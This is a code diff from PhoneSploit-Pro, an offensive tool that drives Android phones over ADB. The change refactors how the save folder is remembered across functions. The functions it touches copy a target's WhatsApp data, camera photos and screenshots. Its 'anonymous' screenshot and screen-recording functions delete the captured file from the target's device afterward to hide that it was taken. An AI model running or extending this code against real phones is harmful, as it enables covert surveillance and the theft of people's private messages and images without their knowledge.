@@ -140,37 +140,41 @@ def get_shell():
 
 
 def get_screenshot():
+    global screenshot_location
     # Getting a temporary file name to store time specific results
     file_name = f'screenshot-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.png'
     os.system(f"adb shell screencap -p /sdcard/{file_name}")
-    print("\nEnter location to save screenshot, Press 'Enter' for default")
-    destination = input("> ")
-    if destination == "":
-        destination = 'Downloaded-Files'
+    if screenshot_location == '':
         print(
-            f"\n{color.CYAN}Saving screenshot to PhoneSploit-Pro/{destination}\n{color.WHITE}")
+            f"\n{color.YELLOW}Enter location to save all screenshots, Press 'Enter' for default{color.WHITE}")
+        screenshot_location = input("> ")
+    if screenshot_location == "":
+        screenshot_location = 'Downloaded-Files'
+        print(
+            f"\n{color.CYAN}Saving screenshot to PhoneSploit-Pro/{screenshot_location}\n{color.WHITE}")
     else:
         print(
-            f"\n{color.CYAN}Saving screenshot to {destination}\n{color.WHITE}")
+            f"\n{color.CYAN}Saving screenshot to {screenshot_location}\n{color.WHITE}")
 
-    os.system(f"adb pull /sdcard/{file_name} {destination}")
+    os.system(f"adb pull /sdcard/{file_name} {screenshot_location}")
 
     # Asking to open file
     choice = input('\nDo you want to Open the file?     Y / N > ').lower()
     if choice == 'y' or choice == '':
-        os.system(f"{opener} {destination}/{file_name}")
+        os.system(f"{opener} {screenshot_location}/{file_name}")
 
     elif not choice == 'n':
         while choice != 'y' and choice != 'n' and choice != '':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
             if choice == 'y' or choice == '':
-                os.system(f"{opener} {destination}/{file_name}")
+                os.system(f"{opener} {screenshot_location}/{file_name}")
 
     print("\n")
 
 
 def screenrecord():
+    global screenrecord_location
     # Getting a temporary file name to store time specific results
     file_name = f'vid-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.mp4'
 
@@ -178,43 +182,49 @@ def screenrecord():
     print('\nStarting Screen Recording...\n')
     os.system(
         f"adb shell screenrecord --verbose --time-limit {duration} /sdcard/{file_name}")
-    print("\nEnter location to save video, Press 'Enter' for default")
-    destination = input("> ")
-    if destination == "":
-        destination = 'Downloaded-Files'
+
+    if screenrecord_location == '':
         print(
-            f"\n{color.CYAN}Saving video to PhoneSploit-Pro/{destination}\n{color.WHITE}")
+            f"\n{color.YELLOW}Enter location to save all videos, Press 'Enter' for default{color.WHITE}")
+        screenrecord_location = input("> ")
+    if screenrecord_location == "":
+        screenrecord_location = 'Downloaded-Files'
+        print(
+            f"\n{color.CYAN}Saving video to PhoneSploit-Pro/{screenrecord_location}\n{color.WHITE}")
     else:
         print(
-            f"\n{color.CYAN}Saving video to {destination}\n{color.WHITE}")
+            f"\n{color.CYAN}Saving video to {screenrecord_location}\n{color.WHITE}")
 
-    os.system(f"adb pull /sdcard/{file_name} {destination}")
+    os.system(f"adb pull /sdcard/{file_name} {screenrecord_location}")
 
     # Asking to open file
     choice = input('\nDo you want to Open the file?     Y / N > ').lower()
     if choice == 'y' or choice == '':
-        os.system(f"{opener} {destination}/{file_name}")
+        os.system(f"{opener} {screenrecord_location}/{file_name}")
 
     elif not choice == 'n':
         while choice != 'y' and choice != 'n' and choice != '':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
             if choice == 'y' or choice == '':
-                os.system(f"{opener} {destination}/{file_name}")
+                os.system(f"{opener} {screenrecord_location}/{file_name}")
     print("\n")
 
 
 def pull_file():
+    global pull_location
     location = input("\nEnter file path : /sdcard/")
-    print("\nEnter location to save file, Press 'Enter' for default")
-    destination = input("> ")
-    if destination == "":
-        destination = 'Downloaded-Files'
+    if pull_location == '':
         print(
-            f"\n{color.CYAN}Saving file to PhoneSploit-Pro/{destination}\n{color.WHITE}")
+            f"\n{color.YELLOW}Enter location to save all files, Press 'Enter' for default{color.WHITE}")
+        pull_location = input("> ")
+    if pull_location == "":
+        pull_location = 'Downloaded-Files'
+        print(
+            f"\n{color.CYAN}Saving file to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
     else:
-        print(f"\n{color.CYAN}Saving file to {destination}\n{color.WHITE}")
-    os.system(f'adb pull /sdcard/{location} {destination}')
+        print(f"\n{color.CYAN}Saving file to {pull_location}\n{color.WHITE}")
+    os.system(f'adb pull /sdcard/{location} {pull_location}')
 
     # Asking to open file
     choice = input('\nDo you want to Open the file?     Y / N > ').lower()
@@ -230,14 +240,14 @@ def pull_file():
 
     # processing request
     if choice == 'y' or choice == '':
-        os.system(f"{opener} {destination}/{location}")
+        os.system(f"{opener} {pull_location}/{location}")
 
     elif not choice == 'n':
         while choice != 'y' and choice != 'n' and choice != '':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
             if choice == 'y' or choice == '':
-                os.system(f"{opener} {destination}/{location}")
+                os.system(f"{opener} {pull_location}/{location}")
 
 
 def push_file():
@@ -396,14 +406,17 @@ def hack():
 
 
 def copy_whatsapp():
-    print("\nEnter location to save WhatsApp Data, Press 'Enter' for default")
-    destination = input("> ")
-    if destination == "":
-        destination = 'Downloaded-Files'
+    global pull_location
+    if pull_location == '':
         print(
-            f"\n{color.CYAN}Saving data to PhoneSploit-Pro/{destination}\n{color.WHITE}")
+            f"\n{color.YELLOW}Enter location to save WhatsApp Data, Press 'Enter' for default{color.WHITE}")
+        pull_location = input("> ")
+    if pull_location == "":
+        pull_location = 'Downloaded-Files'
+        print(
+            f"\n{color.CYAN}Saving data to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
     else:
-        print(f"\n{color.CYAN}Saving data to {destination}\n{color.WHITE}")
+        print(f"\n{color.CYAN}Saving data to {pull_location}\n{color.WHITE}")
 
     location = '/sdcard/Android/media/com.whatsapp/WhatsApp'
     # 'test -d' checks if directory exist or not
@@ -415,55 +428,65 @@ def copy_whatsapp():
     else:
         location = '/sdcard/WhatsApp'
 
-    os.system(f"adb pull {location} {destination}")
+    os.system(f"adb pull {location} {pull_location}")
     print('\n')
 
 
 def copy_screenshots():
-    print("\nEnter location to save Screenshots, Press 'Enter' for default")
-    destination = input("> ")
-    if destination == "":
-        destination = 'Downloaded-Files'
+    global pull_location
+    if pull_location == '':
         print(
-            f"\n{color.CYAN}Saving Screenshots to PhoneSploit-Pro/{destination}\n{color.WHITE}")
+            f"\n{color.YELLOW}Enter location to save all Screenshots, Press 'Enter' for default{color.WHITE}")
+        pull_location = input("> ")
+
+    if pull_location == "":
+        pull_location = 'Downloaded-Files'
+        print(
+            f"\n{color.CYAN}Saving Screenshots to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
     else:
-        print(f"\n{color.CYAN}Saving Screenshots to {destination}\n{color.WHITE}")
+        print(f"\n{color.CYAN}Saving Screenshots to {pull_location}\n{color.WHITE}")
 
     location = '/sdcard/Pictures/Screenshots'
-    os.system(f"adb pull {location} {destination}")
+    os.system(f"adb pull {location} {pull_location}")
     print('\n')
 
 
 def copy_camera():
-    print("\nEnter location to save Photos, Press 'Enter' for default")
-    destination = input("> ")
-    if destination == "":
-        destination = 'Downloaded-Files'
+    global pull_location
+    if pull_location == '':
         print(
-            f"\n{color.CYAN}Saving Photos to PhoneSploit-Pro/{destination}\n{color.WHITE}")
+            f"\n{color.YELLOW}Enter location to save all Photos, Press 'Enter' for default{color.WHITE}")
+        pull_location = input("> ")
+    if pull_location == "":
+        pull_location = 'Downloaded-Files'
+        print(
+            f"\n{color.CYAN}Saving Photos to PhoneSploit-Pro/{pull_location}\n{color.WHITE}")
     else:
-        print(f"\n{color.CYAN}Saving Photos to {destination}\n{color.WHITE}")
+        print(f"\n{color.CYAN}Saving Photos to {pull_location}\n{color.WHITE}")
 
     location = '/sdcard/DCIM/Camera'
-    os.system(f"adb pull {location} {destination}")
+    os.system(f"adb pull {location} {pull_location}")
     print('\n')
 
 
 def anonymous_screenshot():
+    global screenshot_location
     # Getting a temporary file name to store time specific results
     file_name = f'screenshot-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.png'
     os.system(f"adb shell screencap -p /sdcard/{file_name}")
-    print("\nEnter location to save screenshot, Press 'Enter' for default")
-    destination = input("> ")
-    if destination == "":
-        destination = 'Downloaded-Files'
+    if screenshot_location == '':
         print(
-            f"\n{color.CYAN}Saving screenshot to PhoneSploit-Pro/{destination}\n{color.CYAN}")
+            f"\n{color.YELLOW}Enter location to save all screenshots, Press 'Enter' for default{color.WHITE}")
+        screenshot_location = input("> ")
+    if screenshot_location == "":
+        screenshot_location = 'Downloaded-Files'
+        print(
+            f"\n{color.CYAN}Saving screenshot to PhoneSploit-Pro/{screenshot_location}\n{color.WHITE}")
     else:
         print(
-            f"\n{color.CYAN}Saving screenshot to {destination}\n{color.CYAN}")
+            f"\n{color.CYAN}Saving screenshot to {screenshot_location}\n{color.WHITE}")
 
-    os.system(f"adb pull /sdcard/{file_name} {destination}")
+    os.system(f"adb pull /sdcard/{file_name} {screenshot_location}")
 
     print(f'\n{color.YELLOW}Deleting screenshot from Target\'s device\n{color.WHITE}')
     os.system(f"adb shell rm /sdcard/{file_name}")
@@ -471,19 +494,20 @@ def anonymous_screenshot():
     # Asking to open file
     choice = input('\nDo you want to Open the file?     Y / N > ').lower()
     if choice == 'y' or choice == '':
-        os.system(f"{opener} {destination}/{file_name}")
+        os.system(f"{opener} {screenshot_location}/{file_name}")
 
     elif not choice == 'n':
         while choice != 'y' and choice != 'n' and choice != '':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
             if choice == 'y' or choice == '':
-                os.system(f"{opener} {destination}/{file_name}")
+                os.system(f"{opener} {screenshot_location}/{file_name}")
 
     print("\n")
 
 
 def anonymous_screenrecord():
+    global screenrecord_location
     # Getting a temporary file name to store time specific results
     file_name = f'vid-{datetime.datetime.now().year}-{datetime.datetime.now().month}-{datetime.datetime.now().day}-{datetime.datetime.now().hour}-{datetime.datetime.now().minute}-{datetime.datetime.now().second}.mp4'
 
@@ -491,31 +515,34 @@ def anonymous_screenrecord():
     print('\nStarting Screen Recording...\n')
     os.system(
         f"adb shell screenrecord --verbose --time-limit {duration} /sdcard/{file_name}")
-    print("\nEnter location to save video, Press 'Enter' for default")
-    destination = input("> ")
-    if destination == "":
-        destination = 'Downloaded-Files'
+
+    if screenrecord_location == '':
         print(
-            f"\n{color.CYAN}Saving video to PhoneSploit-Pro/{destination}\n{color.WHITE}")
+            f"\n{color.YELLOW}Enter location to save all videos, Press 'Enter' for default{color.WHITE}")
+        screenrecord_location = input("> ")
+    if screenrecord_location == "":
+        screenrecord_location = 'Downloaded-Files'
+        print(
+            f"\n{color.CYAN}Saving video to PhoneSploit-Pro/{screenrecord_location}\n{color.WHITE}")
     else:
         print(
-            f"\n{color.CYAN}Saving video to {destination}\n{color.WHITE}")
+            f"\n{color.CYAN}Saving video to {screenrecord_location}\n{color.WHITE}")
 
-    os.system(f"adb pull /sdcard/{file_name} {destination}")
+    os.system(f"adb pull /sdcard/{file_name} {screenrecord_location}")
 
     print(f'\n{color.YELLOW}Deleting video from Target\'s device\n{color.WHITE}')
     os.system(f"adb shell rm /sdcard/{file_name}")
     # Asking to open file
     choice = input('\nDo you want to Open the file?     Y / N > ').lower()
     if choice == 'y' or choice == '':
-        os.system(f"{opener} {destination}/{file_name}")
+        os.system(f"{opener} {screenrecord_location}/{file_name}")
 
     elif not choice == 'n':
         while choice != 'y' and choice != 'n' and choice != '':
             choice = input(
                 '\nInvalid choice!, Press Y or N > ').lower()
             if choice == 'y' or choice == '':
-                os.system(f"{opener} {destination}/{file_name}")
+                os.system(f"{opener} {screenrecord_location}/{file_name}")
     print("\n")
 
 
@@ -796,6 +823,12 @@ operating_system = ''
 clear = 'clear'
 opener = 'xdg-open'
 page = banner.menu1
+
+# Locations
+screenshot_location = ''
+screenrecord_location = ''
+pull_location = ''
+
 # Concatenating banner color with the selected banner
 selected_banner = random.choice(
     color.color_list) + random.choice(banner.banner_list)
